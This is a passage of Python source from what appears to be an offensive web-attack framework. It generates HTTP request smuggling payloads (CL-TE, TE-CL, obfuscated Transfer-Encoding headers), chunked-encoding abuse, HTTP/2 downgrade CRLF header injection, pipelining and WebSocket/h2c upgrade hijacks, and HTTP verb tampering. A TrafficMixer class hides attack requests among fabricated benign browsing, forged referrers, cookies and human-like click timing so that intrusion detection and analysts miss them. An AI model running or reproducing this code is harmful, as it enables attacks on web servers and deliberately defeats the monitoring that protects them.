            smuggled_hex_len = hex(len(smuggled_request))[2:]

            # TE obfuscation variations that may be treated differently
            te_variations: List[Tuple[str, str]] = [
                ("Transfer-Encoding: xchunked", "Invalid TE value 'xchunked'"),
                ("Transfer-Encoding : chunked", "Space before colon"),
                ("Transfer-Encoding: chunked\r\nTransfer-Encoding: x", "Duplicate TE, second invalid"),
                ("Transfer-Encoding: x\r\nTransfer-Encoding: chunked", "Duplicate TE, first invalid"),
                ("Transfer-encoding: chunked", "Lowercase 'encoding'"),
                ("Transfer-Encoding: chunked\r\nTransfer-encoding: x", "Mixed case duplicate TE"),
                ("Transfer-Encoding:\r\n chunked", "Line folding (obs-fold)"),
                ("Transfer-Encoding: chunk\x65d", "Hex escape in value"),
                ("X: X\r\nTransfer-Encoding: chunked", "TE after custom header"),
                ("Transfer-Encoding: chunKed", "Mixed case 'chunKed'"),
                ("Transfer-Encoding: chunked\x00", "Null byte after value"),
                ("Transfer-Encoding: \tchunked\t", "Tab padding"),
            ]

            for te_header, description in te_variations:
                body = (
                    f"{smuggled_hex_len}\r\n"
                    f"{smuggled_request}\r\n"
                    f"0\r\n"
                    f"\r\n"
                )
                front_end = (
                    f"POST {front_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"{te_header}\r\n"
                    f"\r\n"
                    f"{body}"
                )
                payloads.append(SmugglePayload(
                    technique=f"TE-TE: {description}",
                    front_end_request=front_end,
                    back_end_request=smuggled_request,
                    smuggled_content=smuggled_request,
                    content_length=len(body),
                    transfer_encoding=te_header,
                    description=f"TE-TE obfuscation: {description}",
                    target_servers=["mixed-proxy-configurations"],
                ))

            self._smuggle_counter += len(payloads)
            self._technique_stats["te_te"]["generated"] += len(payloads)
            self._record_generation("te_te_desync", len(payloads))

            logger.debug(
                "Generated %d TE-TE desync payloads with obfuscation variants",
                len(payloads),
            )
            return payloads

    def generate_smuggling_payloads(
        self,
        target_path: str,
        *,
        host: str = "target.com",
        methods: Optional[List[str]] = None,
    ) -> List[SmugglePayload]:
        """
        Generate a comprehensive set of HTTP request smuggling payloads.

        Creates smuggling payloads across all desync types (CL-TE, TE-CL,
        TE-TE) targeting a specific path.

        Args:
            target_path: Path to target with smuggled request.
            host: Target host header value.
            methods: HTTP methods for smuggled requests. Defaults to GET/POST.

        Returns:
            List of SmugglePayload objects.
        """
        with self._lock:
            if methods is None:
                methods = ["GET", "POST"]

            all_payloads: List[SmugglePayload] = []

            for method in methods:
                smuggled = (
                    f"{method} {target_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: 0\r\n"
                    f"\r\n"
                )

                all_payloads.extend(
                    self.generate_cl_te_desync(smuggled, host=host)
                )
                all_payloads.extend(
                    self.generate_te_cl_desync(smuggled, host=host)
                )
                all_payloads.extend(
                    self.generate_te_te_desync(smuggled, host=host)
                )

            # Limit total payloads
            if len(all_payloads) > MAX_SMUGGLING_PAYLOADS:
                all_payloads = all_payloads[:MAX_SMUGGLING_PAYLOADS]

            logger.info(
                "Generated %d total smuggling payloads for path=%s",
                len(all_payloads), target_path,
            )
            return all_payloads

    def chunked_encoding_abuse(
        self,
        body: str,
        *,
        host: str = "target.com",
        path: str = "/",
    ) -> List[Dict[str, Any]]:
        """
        Generate chunked encoding abuse payloads.

        Exploits differences in how servers parse chunked Transfer-Encoding:
        - Invalid chunk sizes (negative, overflow, hex variations)
        - Chunk extensions
        - Trailing headers
        - Chunked + Content-Length conflicts
        - Zero-length chunks in middle
        - Chunk size with leading zeros

        Args:
            body: Request body to encode.
            host: Target host.
            path: Request path.

        Returns:
            List of dicts with 'name', 'request', 'description'.
        """
        with self._lock:
            payloads: List[Dict[str, Any]] = []
            body_hex_len = hex(len(body))[2:]

            # 1. Normal chunked (baseline)
            normal = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body_hex_len}\r\n"
                f"{body}\r\n"
                f"0\r\n"
                f"\r\n"
            )
            payloads.append({
                "name": "normal_chunked",
                "request": normal,
                "description": "Baseline normal chunked encoding",
            })

            # 2. Chunk size with leading zeros
            padded_hex = body_hex_len.zfill(8)
            payloads.append({
                "name": "leading_zeros",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{padded_hex}\r\n"
                    f"{body}\r\n"
                    f"0\r\n"
                    f"\r\n"
                ),
                "description": "Chunk size with leading zeros",
            })

            # 3. Chunk extensions
            payloads.append({
                "name": "chunk_extension",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{body_hex_len};ext=val;another=param\r\n"
                    f"{body}\r\n"
                    f"0\r\n"
                    f"\r\n"
                ),
                "description": "Chunk size with extensions (RFC compliant but unusual)",
            })

            # 4. Uppercase hex chunk size
            payloads.append({
                "name": "uppercase_hex",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{body_hex_len.upper()}\r\n"
                    f"{body}\r\n"
                    f"0\r\n"
                    f"\r\n"
                ),
                "description": "Uppercase hex digits in chunk size",
            })

            # 5. Chunked + Content-Length conflict
            payloads.append({
                "name": "chunked_cl_conflict",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Length: {len(body) + 100}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{body_hex_len}\r\n"
                    f"{body}\r\n"
                    f"0\r\n"
                    f"\r\n"
                ),
                "description": "Conflicting Content-Length and Transfer-Encoding",
            })

            # 6. Extra CRLF before chunk size
            payloads.append({
                "name": "extra_crlf",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"\r\n"
                    f"{body_hex_len}\r\n"
                    f"{body}\r\n"
                    f"0\r\n"
                    f"\r\n"
                ),
                "description": "Extra CRLF before first chunk",
            })

            # 7. LF-only line endings (no CR)
            payloads.append({
                "name": "lf_only",
                "request": (
                    f"POST {path} HTTP/1.1\n"
                    f"Host: {host}\n"
                    f"Transfer-Encoding: chunked\n"
                    f"\n"
                    f"{body_hex_len}\n"
                    f"{body}\n"
                    f"0\n"
                    f"\n"
                ),
                "description": "LF-only line endings instead of CRLF",
            })

            # 8. Trailing headers after final chunk
            payloads.append({
                "name": "trailing_headers",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"Trailer: X-Checksum\r\n"
                    f"\r\n"
                    f"{body_hex_len}\r\n"
                    f"{body}\r\n"
                    f"0\r\n"
                    f"X-Checksum: {hashlib.md5(body.encode()).hexdigest()}\r\n"
                    f"\r\n"
                ),
                "description": "Trailing headers after last chunk",
            })

            # 9. Zero-length chunk in middle
            half = len(body) // 2
            first_half = body[:half]
            second_half = body[half:]
            payloads.append({
                "name": "zero_mid_chunk",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{hex(len(first_half))[2:]}\r\n"
                    f"{first_half}\r\n"
                    f"0\r\n"
                    f"\r\n"
                    f"{hex(len(second_half))[2:]}\r\n"
                    f"{second_half}\r\n"
                    f"0\r\n"
                    f"\r\n"
                ),
                "description": "Zero-length terminator chunk followed by more data",
            })

            # 10. Negative/invalid chunk size
            payloads.append({
                "name": "invalid_chunk_size",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"FFFFFFFE\r\n"
                    f"{body}\r\n"
                    f"0\r\n"
                    f"\r\n"
                ),
                "description": "Very large/invalid chunk size (near uint32 max)",
            })

            # 11. Space before chunk size
            payloads.append({
                "name": "space_chunk_size",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f" {body_hex_len}\r\n"
                    f"{body}\r\n"
                    f"0\r\n"
                    f"\r\n"
                ),
                "description": "Leading space before chunk size",
            })

            # 12. Multiple small chunks
            chunk_payloads_parts: List[str] = []
            for ch in body:
                chunk_payloads_parts.append(f"1\r\n{ch}\r\n")
            chunk_payloads_parts.append("0\r\n\r\n")
            payloads.append({
                "name": "byte_by_byte_chunks",
                "request": (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"{''.join(chunk_payloads_parts)}"
                ),
                "description": "One byte per chunk to overwhelm chunk parsing",
            })

            self._technique_stats["chunked_abuse"]["generated"] += len(payloads)
            self._record_generation("chunked_encoding_abuse", len(payloads))

            logger.debug(
                "Generated %d chunked encoding abuse payloads", len(payloads),
            )
            return payloads

    def http2_downgrade_attack(
        self,
        request_path: str,
        *,
        host: str = "target.com",
        smuggled_headers: Optional[Dict[str, str]] = None,
    ) -> List[Dict[str, Any]]:
        """
        Generate HTTP/2 downgrade attack patterns.

        When a front-end proxy translates HTTP/2 to HTTP/1.1 for the backend,
        certain HTTP/2-specific features can be exploited to inject headers
        or smuggle requests through the translation layer.

        Args:
            request_path: Target request path.
            host: Target host header.
            smuggled_headers: Additional headers to inject.

        Returns:
            List of dicts with attack patterns.
        """
        with self._lock:
            if smuggled_headers is None:
                smuggled_headers = {}

            attacks: List[Dict[str, Any]] = []

            # 1. Pseudo-header injection via HTTP/2
            attacks.append({
                "name": "h2_pseudo_header_injection",
                "h2_headers": [
                    (":method", "GET"),
                    (":path", request_path),
                    (":authority", host),
                    (":scheme", "https"),
                    ("transfer-encoding", "chunked"),
                ],
                "description": (
                    "HTTP/2 request with Transfer-Encoding header that "
                    "shouldn't exist in H2 but may be forwarded in H1 translation"
                ),
                "impact": "May cause desync when downgraded to HTTP/1.1",
            })

            # 2. Header name with colon (pseudo-header-like)
            attacks.append({
                "name": "h2_colon_header",
                "h2_headers": [
                    (":method", "GET"),
                    (":path", request_path),
                    (":authority", host),
                    (":scheme", "https"),
                    ("x:custom", "injected"),
                ],
                "description": "Header name with colon to mimic pseudo-headers",
                "impact": "May confuse H2-to-H1 translation",
            })

            # 3. Newline in header value
            attacks.append({
                "name": "h2_newline_header_value",
                "h2_headers": [
                    (":method", "GET"),
                    (":path", request_path),
                    (":authority", host),
                    (":scheme", "https"),
                    ("x-injected", f"value\r\nInjected-Header: malicious"),
                ],
                "description": "CRLF injection in H2 header value",
                "impact": "Header injection when downgraded to HTTP/1.1",
            })

            # 4. Method override via H2 pseudo-header
            attacks.append({
                "name": "h2_method_override",
                "h2_headers": [
                    (":method", "GET"),
                    (":path", request_path),
                    (":authority", host),
                    (":scheme", "https"),
                    ("x-http-method-override", "POST"),
                    ("x-method-override", "PUT"),
                ],
                "description": "Method override headers in HTTP/2 request",
                "impact": "Backend may process as different method than IDS inspects",
            })

            # 5. Path with fragment
            attacks.append({
                "name": "h2_path_fragment",
                "h2_headers": [
                    (":method", "GET"),
                    (":path", f"{request_path}#fragment"),
                    (":authority", host),
                    (":scheme", "https"),
                ],
                "description": "Path with fragment identifier in H2",
                "impact": "Fragment handling differences between H2 and H1",
            })

            # 6. URL-encoded path differences
            encoded_path = urllib.parse.quote(request_path, safe="")
            attacks.append({
                "name": "h2_encoded_path",
                "h2_headers": [
                    (":method", "GET"),
                    (":path", encoded_path),
                    (":authority", host),
                    (":scheme", "https"),
                ],
                "description": "Fully URL-encoded path in H2 pseudo-header",
                "impact": "Normalization differences in H2-H1 translation",
            })

            # Add any smuggled headers to each attack
            if smuggled_headers:
                for attack in attacks:
                    for hdr_name, hdr_val in smuggled_headers.items():
                        attack["h2_headers"].append((hdr_name, hdr_val))

            self._technique_stats["h2_downgrade"]["generated"] += len(attacks)
            self._record_generation("http2_downgrade", len(attacks))

            logger.debug(
                "Generated %d HTTP/2 downgrade attack patterns", len(attacks),
            )
            return attacks

    def http_pipelining_abuse(
        self,
        requests: List[Dict[str, str]],
        *,
        host: str = "target.com",
        inject_between: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """
        Generate HTTP pipelining abuse payloads.

        HTTP pipelining sends multiple requests without waiting for responses.
        Some IDS systems may only inspect the first request in a pipeline,
        missing malicious content in subsequent requests.

        Args:
            requests: List of dicts with 'method', 'path', 'body' keys.
            host: Target host.
            inject_between: Optional data to inject between pipelined requests.

        Returns:
            List of dicts with pipelining attack patterns.
        """
        with self._lock:
            if not requests:
                return []

            attacks: List[Dict[str, Any]] = []

            # Build pipelined request
            pipeline_parts: List[str] = []
            for i, req in enumerate(requests):
                method = req.get("method", "GET")
                path = req.get("path", "/")
                body = req.get("body", "")

                request_line = f"{method} {path} HTTP/1.1\r\n"
                headers = f"Host: {host}\r\n"
                if body:
                    headers += f"Content-Length: {len(body)}\r\n"
                headers += "Connection: keep-alive\r\n"
                headers += "\r\n"

                full_request = request_line + headers + body
                pipeline_parts.append(full_request)

                if inject_between and i < len(requests) - 1:
                    pipeline_parts.append(inject_between)

            # Normal pipeline
            attacks.append({
                "name": "normal_pipeline",
                "pipelined_data": "".join(pipeline_parts),
                "request_count": len(requests),
                "description": "Standard HTTP pipelining with multiple requests",
                "ids_risk": "IDS may only inspect first request",
            })

            # Pipeline with malicious request buried
            if len(requests) > 2:
                # Swap first and middle request
                swapped = pipeline_parts[:]
                mid = len(swapped) // 2
                swapped[0], swapped[mid] = swapped[mid], swapped[0]
                attacks.append({
                    "name": "buried_pipeline",
                    "pipelined_data": "".join(swapped),
                    "request_count": len(requests),
                    "description": "Pipeline with attack request buried in middle",
                    "ids_risk": "IDS may stop inspecting after first N requests",
                })

            # Pipeline with delay simulation (encoded as metadata)
            attacks.append({
                "name": "slow_pipeline",
                "pipelined_data": "".join(pipeline_parts),
                "request_count": len(requests),
                "inter_request_delay_ms": 5000,
                "description": "Slow pipelining with delays between requests",
                "ids_risk": "IDS may timeout pipeline context",
            })

            self._technique_stats["pipelining"]["generated"] += len(attacks)
            self._record_generation("http_pipelining", len(attacks))

            logger.debug(
                "Generated %d HTTP pipelining abuse payloads", len(attacks),
            )
            return attacks

    def websocket_upgrade_hijack(
        self,
        target_path: str,
        *,
        host: str = "target.com",
        smuggled_data: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """
        Generate WebSocket upgrade hijack payloads.

        After a WebSocket upgrade, many IDS systems stop inspecting the
        connection as HTTP. By initiating a WebSocket upgrade (or faking one),
        subsequent data may bypass HTTP-level inspection.

        Args:
            target_path: WebSocket endpoint path.
            host: Target host.
            smuggled_data: Data to send after upgrade.

        Returns:
            List of dicts with WebSocket hijack patterns.
        """
        with self._lock:
            attacks: List[Dict[str, Any]] = []
            ws_key = hashlib.sha1(
                uuid.uuid4().bytes
            ).digest()
            ws_key_b64 = __import__("base64").b64encode(ws_key[:16]).decode()

            # 1. Standard WebSocket upgrade
            upgrade_request = (
                f"GET {target_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key_b64}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"\r\n"
            )
            attacks.append({
                "name": "ws_upgrade_standard",
                "request": upgrade_request,
                "post_upgrade_data": smuggled_data or "",
                "description": "Standard WebSocket upgrade to bypass HTTP inspection",
                "ids_impact": "IDS stops HTTP parsing after upgrade response",
            })

            # 2. Fake upgrade (no server support expected)
            fake_upgrade = (
                f"GET {target_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade, keep-alive\r\n"
                f"Sec-WebSocket-Key: {ws_key_b64}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"\r\n"
            )
            attacks.append({
                "name": "ws_upgrade_fake",
                "request": fake_upgrade,
                "post_upgrade_data": smuggled_data or "",
                "description": "Fake WebSocket upgrade with keep-alive fallback",
                "ids_impact": "IDS may switch to WS mode even without 101 response",
            })

            # 3. h2c upgrade (HTTP/2 cleartext)
            h2c_upgrade = (
                f"GET {target_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Upgrade: h2c\r\n"
                f"Connection: Upgrade, HTTP2-Settings\r\n"
                f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
                f"\r\n"
            )
            attacks.append({
                "name": "h2c_upgrade",
                "request": h2c_upgrade,
                "post_upgrade_data": smuggled_data or "",
                "description": "HTTP/2 cleartext upgrade to bypass HTTP/1.1 inspection",
                "ids_impact": "IDS may not parse HTTP/2 frames after upgrade",
            })

            # 4. WebSocket with origin mismatch
            attacks.append({
                "name": "ws_origin_mismatch",
                "request": (
                    f"GET {target_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {ws_key_b64}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"Origin: https://evil.com\r\n"
                    f"\r\n"
                ),
                "post_upgrade_data": smuggled_data or "",
                "description": "WebSocket upgrade with mismatched Origin header",
                "ids_impact": "Cross-origin WebSocket may bypass same-origin checks",
            })

            self._technique_stats["ws_hijack"]["generated"] += len(attacks)
            self._record_generation("websocket_hijack", len(attacks))

            logger.debug(
                "Generated %d WebSocket upgrade hijack payloads", len(attacks),
            )
            return attacks

    def verb_tampering(
        self,
        original_method: str,
        path: str,
        *,
        host: str = "target.com",
        body: str = "",
    ) -> List[Dict[str, Any]]:
        """
        Generate HTTP verb/method tampering payloads.

        IDS rules often match specific HTTP methods (e.g., GET or POST).
        By using alternative or custom methods, the same request may bypass
        method-specific rules.

        Techniques:
            - Standard method swap (GET <-> POST)
            - Uncommon methods (PATCH, OPTIONS, TRACE, CONNECT)
            - Custom/invalid methods
            - X-HTTP-Method-Override headers
            - Method case variations

        Args:
            original_method: The original HTTP method.
            path: Request path.
            host: Target host.
            body: Request body.

        Returns:
            List of dicts with verb tampering payloads.
        """
        with self._lock:
            payloads: List[Dict[str, Any]] = []

            # Method alternatives
            method_alternatives: List[Tuple[str, str]] = [
                ("POST", "Use POST instead of original method"),
                ("PUT", "Use PUT for body delivery"),
                ("PATCH", "Use PATCH (less commonly filtered)"),
                ("DELETE", "Use DELETE (may bypass GET/POST rules)"),
                ("OPTIONS", "Use OPTIONS (often allowed through WAF/IDS)"),
                ("HEAD", "Use HEAD (may bypass body inspection)"),
                ("TRACE", "Use TRACE (diagnostic method)"),
                ("CONNECT", "Use CONNECT (tunnel method)"),
                ("PROPFIND", "WebDAV method (unusual, may bypass rules)"),
                ("MOVE", "WebDAV MOVE method"),
                ("COPY", "WebDAV COPY method"),
                ("LOCK", "WebDAV LOCK method"),
                ("MKCOL", "WebDAV MKCOL method"),
                ("PURGE", "Cache purge method (CDN-specific)"),
                ("BAN", "Varnish BAN method"),
            ]

            for method, desc in method_alternatives:
                if method.upper() == original_method.upper():
                    continue

                headers = f"Host: {host}\r\n"
                if body:
                    headers += f"Content-Length: {len(body)}\r\n"
                    headers += "Content-Type: application/x-www-form-urlencoded\r\n"

                request = (
                    f"{method} {path} HTTP/1.1\r\n"
                    f"{headers}"
                    f"\r\n"
                    f"{body}"
                )
                payloads.append({
                    "name": f"verb_{method.lower()}",
                    "method": method,
                    "original_method": original_method,
                    "request": request,
                    "description": desc,
                })

            # Custom/invented methods
            custom_methods = [
                "GIST", "GETS", "POSTS", "JEFF", "BREW",
                "WHEN", "HACK", "TEST",
            ]
            for custom in custom_methods:
                request = (
                    f"{custom} {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"\r\n"
                    f"{body}"
                )
                payloads.append({
                    "name": f"verb_custom_{custom.lower()}",
                    "method": custom,
                    "original_method": original_method,
                    "request": request,
                    "description": f"Custom method '{custom}' (may bypass all method rules)",
                })

            # X-HTTP-Method-Override variants
            override_headers = [
                "X-HTTP-Method-Override",
                "X-HTTP-Method",
                "X-Method-Override",
                "_method",
            ]
            for override_hdr in override_headers:
                request = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"{override_hdr}: {original_method}\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"\r\n"
                    f"{body}"
                )
                payloads.append({
                    "name": f"verb_override_{override_hdr.lower().replace('-', '_')}",
                    "method": "POST",
                    "override_header": override_hdr,
                    "original_method": original_method,
                    "request": request,
                    "description": f"Method override via {override_hdr} header",
                })

            # Case variations of original method
            case_variants = [
                original_method.lower(),
                original_method.upper(),
                original_method.capitalize(),
                original_method[0].lower() + original_method[1:].upper(),
            ]
            seen: Set[str] = {original_method}
            for variant in case_variants:
                if variant not in seen:
                    seen.add(variant)
                    request = (
                        f"{variant} {path} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"\r\n"
                        f"{body}"
                    )
                    payloads.append({
                        "name": f"verb_case_{variant}",
                        "method": variant,
                        "original_method": original_method,
                        "request": request,
                        "description": f"Case variation '{variant}' of {original_method}",
                    })

            self._technique_stats["verb_tampering"]["generated"] += len(payloads)
            self._record_generation("verb_tampering", len(payloads))

            logger.debug(
                "Generated %d verb tampering payloads (original=%s)",
                len(payloads), original_method,
            )
            return payloads

    def get_technique_stats(self) -> Dict[str, Dict[str, int]]:
        """Return protocol abuse technique statistics."""
        with self._lock:
            return dict(self._technique_stats)

    def _record_generation(self, technique: str, count: int) -> None:
        """Record payload generation for statistics."""
        self._generated_payloads.append({
            "technique": technique,
            "count": count,
            "timestamp": time.time(),
        })

    def to_dict(self) -> Dict[str, Any]:
        """Serialize abuser state."""
        with self._lock:
            return {
                "smuggle_counter": self._smuggle_counter,
                "technique_stats": dict(self._technique_stats),
                "history_size": len(self._generated_payloads),
            }


# ════════════════════════════════════════════════════════════════════════════════
# TRAFFIC MIXER
# ════════════════════════════════════════════════════════════════════════════════

class TrafficMixer:
    """
    Interleave attack traffic with legitimate-looking traffic patterns.

    Generates realistic browsing behavior, API calls, and other normal
    traffic to blend attack requests into a background of benign activity,
    making it harder for IDS analysts and ML-based detection to isolate
    malicious requests.

    Usage:
        mixer = TrafficMixer()
        mixed = mixer.interleave_with_browsing(attack_requests, ratio=5)
        ua = mixer.get_random_user_agent(profile=TrafficProfile.WEB_BROWSING)
        chain = mixer.generate_referrer_chain(depth=5)
        cookies = mixer.simulate_cookie_accumulation(pages_visited=10)
        timing = mixer.get_realistic_click_timing(num_clicks=20)
    """

    def __init__(
        self,
        *,
        benign_ratio: float = 5.0,
        user_agent_rotation: bool = True,
    ) -> None:
        self._lock = threading.RLock()
        self._benign_ratio = max(1.0, benign_ratio)
        self._user_agent_rotation = user_agent_rotation
        self._current_ua_index: int = 0
        self._session_cookies: Dict[str, str] = {}
        self._browsing_history: Deque[str] = deque(maxlen=500)
        self._request_counter: int = 0
        self._referrer_chain: List[str] = []

        # Pre-built traffic pattern templates
        self._browsing_patterns = self._build_browsing_patterns()
        self._api_patterns = self._build_api_patterns()

        logger.info(
            "TrafficMixer initialized: benign_ratio=%.1f, ua_rotation=%s",
            self._benign_ratio, user_agent_rotation,
        )

    def interleave_with_browsing(
        self,
        attack_requests: List[Dict[str, Any]],
        *,
        ratio: Optional[float] = None,
        target_host: str = "target.com",
    ) -> List[Dict[str, Any]]:
        """
        Interleave attack requests with legitimate browsing requests.

        For every attack request, generates N benign requests (where N is
        the ratio) and inserts the attack request at a random position
        within the benign traffic.

        Args:
            attack_requests: List of attack request dicts.
            ratio: Benign-to-attack ratio. Defaults to self._benign_ratio.
            target_host: Host for benign requests.

        Returns:
            Mixed list of attack and benign request dicts.
        """
        with self._lock:
            if ratio is None:
                ratio = self._benign_ratio

            mixed: List[Dict[str, Any]] = []
            ratio_int = max(1, int(ratio))

            for attack in attack_requests:
                # Generate benign requests
                benign_batch: List[Dict[str, Any]] = []
                for _ in range(ratio_int):
                    benign = self._generate_benign_request(target_host)
                    benign_batch.append(benign)

                # Insert attack at random position within benign batch
                insert_pos = random.randint(0, len(benign_batch))
                benign_batch.insert(insert_pos, {
                    **attack,
                    "_is_attack": True,
                    "_mixed_position": insert_pos,
                })

                mixed.extend(benign_batch)

            self._request_counter += len(mixed)
            logger.info(
                "Interleaved %d attack requests with %d benign (ratio=%.1f, total=%d)",
                len(attack_requests),
                len(mixed) - len(attack_requests),
                ratio,
                len(mixed),
            )
            return mixed

    def get_random_user_agent(
        self,
        profile: TrafficProfile = TrafficProfile.WEB_BROWSING,
    ) -> str:
        """
        Get a realistic user agent string matching the traffic profile.

        Args:
            profile: Traffic profile to match.

        Returns:
            User agent string.
        """
        with self._lock:
            if profile == TrafficProfile.MOBILE_APP:
                mobile_uas = [ua for ua in _USER_AGENTS if "Mobile" in ua]
                if mobile_uas:
                    return random.choice(mobile_uas)

            if profile == TrafficProfile.BOT_CRAWLER:
                bots = [
                    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
                    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; libwww-perl/5.837)",
                    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
                ]
                return random.choice(bots)

            if self._user_agent_rotation:
                self._current_ua_index = (self._current_ua_index + 1) % len(_USER_AGENTS)
                return _USER_AGENTS[self._current_ua_index]

            return random.choice(_USER_AGENTS)

    def generate_referrer_chain(
        self,
        target_url: str,
        depth: int = 5,
    ) -> List[str]:
        """
        Generate a realistic referrer chain leading to the target URL.

        Simulates a user clicking through search results and links to
        reach the target, creating a believable referrer trail.

        Args:
            target_url: The final URL in the chain.
            depth: Number of referrer hops.

        Returns:
            List of referrer URLs from first to last.
        """
        with self._lock:
            chain: List[str] = []

            # Start with a search engine
            search_engine = random.choice(_REFERRER_DOMAINS[:4])
            search_term = random.choice(_SEARCH_TERMS)
            chain.append(f"{search_engine}{urllib.parse.quote(search_term)}")

            # Generate intermediate pages
            for i in range(depth - 2):
                domain = random.choice(_REFERRER_DOMAINS[4:])
                path = random.choice(_COMMON_PATHS[:12])
                chain.append(f"{domain}{path}")

            # Final referrer before target
            chain.append(target_url.rsplit("/", 1)[0] + "/" if "/" in target_url else target_url)

            self._referrer_chain = chain
            return chain

    def simulate_cookie_accumulation(
        self,
        pages_visited: int = 10,
        *,
        target_host: str = "target.com",
    ) -> Dict[str, str]:
        """
        Simulate realistic cookie accumulation across page visits.

        Real browsers accumulate cookies as users browse. This simulates
        the gradual accumulation of session, tracking, and preference
        cookies that a real visitor would have.

        Args:
            pages_visited: Number of simulated page visits.
            target_host: Host for cookies.

        Returns:
            Dict of cookie name -> value pairs.
        """
        with self._lock:
            cookies: Dict[str, str] = {}

            # Session cookie (set on first visit)
            cookies["session_id"] = hashlib.sha256(
                f"{target_host}{time.time()}{random.random()}".encode()
            ).hexdigest()[:32]

            # CSRF token (set on first form page)
            if pages_visited >= 2:
                cookies["csrf_token"] = uuid.uuid4().hex[:16]

            # Analytics cookies (set after JS loads)
            if pages_visited >= 1:
                cookies["_ga"] = f"GA1.2.{random.randint(100000, 999999)}.{int(time.time())}"
                cookies["_gid"] = f"GA1.2.{random.randint(100000, 999999)}.{int(time.time())}"

            # Consent cookie
            if pages_visited >= 1:
                cookies["cookie_consent"] = "accepted"

            # Preference cookies (accumulate over time)
            if pages_visited >= 3:
                cookies["lang"] = random.choice(["en", "pt", "es", "fr", "de"])
                cookies["theme"] = random.choice(["light", "dark", "auto"])

            if pages_visited >= 5:
                cookies["last_visited"] = str(int(time.time()) - random.randint(60, 3600))
                cookies["visit_count"] = str(random.randint(2, pages_visited))

            # Tracking cookies
            if pages_visited >= 4:
                cookies["_fbp"] = f"fb.1.{int(time.time())}.{random.randint(100000, 999999)}"

            if pages_visited >= 6:
                cookies["__utm_a"] = str(random.randint(10000, 99999))
                cookies["__utm_z"] = f"{random.randint(1, 9)}.{int(time.time())}.1.1"

            # A/B test cookies
            if pages_visited >= 7:
                cookies["ab_test_group"] = random.choice(["A", "B", "C", "control"])
                cookies["experiment_id"] = f"exp_{random.randint(100, 999)}"

            self._session_cookies = cookies
            return cookies

    def get_realistic_click_timing(
        self,
        num_clicks: int = 20,
    ) -> List[Dict[str, Any]]:
        """
        Generate realistic human click timing patterns.

        Models human browsing behavior with variable delays:
        - Page reading time (2-30 seconds)
        - Link hover time (0.1-0.5 seconds)
        - Occasional long pauses (checking phone, etc.)
        - Faster clicking during form filling

        Args:
            num_clicks: Number of click events to generate.

        Returns:
            List of dicts with 'click_index', 'delay_ms', 'action_type'.
        """
        with self._lock:
            clicks: List[Dict[str, Any]] = []

            for i in range(num_clicks):
                # Determine action type
                action_roll = random.random()
                if action_roll < 0.5:
                    # Normal page reading + click
                    delay_ms = random.gauss(8000, 5000)
                    delay_ms = max(1500, min(45000, delay_ms))
                    action = "page_read_click"
                elif action_roll < 0.7:
                    # Quick navigation (clicking through familiar pages)
                    delay_ms = random.gauss(2000, 1000)
                    delay_ms = max(500, min(5000, delay_ms))
                    action = "quick_nav"
                elif action_roll < 0.85:
                    # Form interaction (typing + clicks)
                    delay_ms = random.gauss(4000, 2000)
                    delay_ms = max(1000, min(15000, delay_ms))
